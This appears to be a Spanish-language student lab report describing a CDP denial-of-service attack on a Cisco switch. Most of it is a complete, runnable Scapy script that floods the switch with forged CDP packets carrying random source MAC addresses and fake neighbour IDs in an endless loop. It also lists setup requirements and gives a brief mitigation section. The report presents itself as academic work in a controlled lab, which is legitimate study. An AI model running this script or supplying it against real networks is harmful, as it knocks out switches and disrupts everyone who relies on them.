# CDP DoS Attack – Scapy  
Autor Mariana Doñe Lara  
Matrícula: 20241200  

1️⃣ Introducción  
En este laboratorio desarrollé un script en Python utilizando Scapy para ejecutar un ataque de Denegación de Servicio (DoS) contra el protocolo CDP (Cisco Discovery Protocol). El ataque se realiza en Capa 2, sin necesidad de direccionamiento IP, y tiene como objetivo saturar el plano de control del switch mediante el envío de múltiples paquetes CDP falsos. Las pruebas fueron realizadas en un entorno controlado y con fines académicos.  

2️⃣ Objetivo del script  
El objetivo del script es inundar el switch con paquetes CDP falsificados, generando vecinos inexistentes y provocando un consumo excesivo de recursos en el dispositivo de red.  

3️⃣ Topología de red utilizada  
🔹 Dispositivos  
Switch Cisco  
Host atacante: Kali Linux  
🔹 VLAN  
VLAN por defecto (VLAN 1)  
🔹 Interfaces  
Kali Linux: eth0  
Switch: Puerto Ethernet conectado al host atacante  
El host atacante se encuentra conectado directamente al switch.  

4️⃣ Script utilizado  
Archivo: cdp_dos.py  
```python
from scapy.all import Ether, LLC, SNAP, Raw, sendp, RandMAC  
import struct  
import random  
import time  

CDP_MULTICAST = "01:00:0c:cc:cc:cc"  
INTERFACE = "eth0"  

def generar_checksum(data):  
    if len(data) % 2 != 0:  
        data += b'\x00'  
    s = 0  
    for i in range(0, len(data), 2):  
        s += (data[i] << 8) + data[i+1]  
    s = (s >> 16) + (s & 0xffff)  
    s += (s >> 16)  
    return (~s) & 0xffff  


def tlv(tipo, valor):  
    return struct.pack("!HH", tipo, len(valor) + 4) + valor  

def crear_cdp():  
    device_id = f"SW-{random.randint(100,999)}".encode()  
    port_id = b"GigabitEthernet0/1"  
    capabilities = struct.pack("!I", 0x01)  
    payload = b""  
    payload += tlv(0x0001, device_id)  
    payload += tlv(0x0003, port_id)  
    payload += tlv(0x0004, capabilities)  
    version = 0x02  
    ttl = random.randint(120, 180)  
    header = struct.pack("!BBH", version, ttl, 0x0000)  
    checksum = generar_checksum(header + payload)  
    return struct.pack("!BBH", version, ttl, checksum) + payload  

print("[*] Iniciando ataque CDP DoS")  
try:  
    while True:  
        cdp_data = crear_cdp()  
        packet = (  
            Ether(src=RandMAC(), dst=CDP_MULTICAST) /  
            LLC(dsap=0xaa, ssap=0xaa, ctrl=3) /  
            SNAP(OUI=0x00000c, code=0x2000) /  
            Raw(load=cdp_data)  
        )  
        sendp(packet, iface=INTERFACE, verbose=False)  
        time.sleep(random.uniform(0.03, 0.07))  
except KeyboardInterrupt:  
    print("\n[!] Ataque detenido")  
```  

5️⃣ Parámetros usados  
MAC destino CDP: 01:00:0c:cc:cc:cc  
Interfaz: eth0  
TTL aleatorio: 120 – 180 segundos  
MAC de origen aleatoria  
Envío continuo de paquetes  

6️⃣ Capturas de pantalla  
Las capturas incluidas evidencian:  
Ejecución del script en Kali Linux  
Saturación de la tabla CDP del switch  

7️⃣ Requisitos  
Kali Linux  
Python 3  
Scapy  
Acceso a un switch Cisco  
Permisos de superusuario  
```bash
pip install scapy
```  

8️⃣ Medidas de mitigación  
Deshabilitar CDP globalmente: no cdp run  
Deshabilitar CDP por interfaz  
Implementar Control Plane Policing (CoPP)  

9️⃣ Conclusión  
Este ataque demuestra cómo CDP puede ser explotado si no se configura correctamente, afectando la estabilidad y seguridad del switch.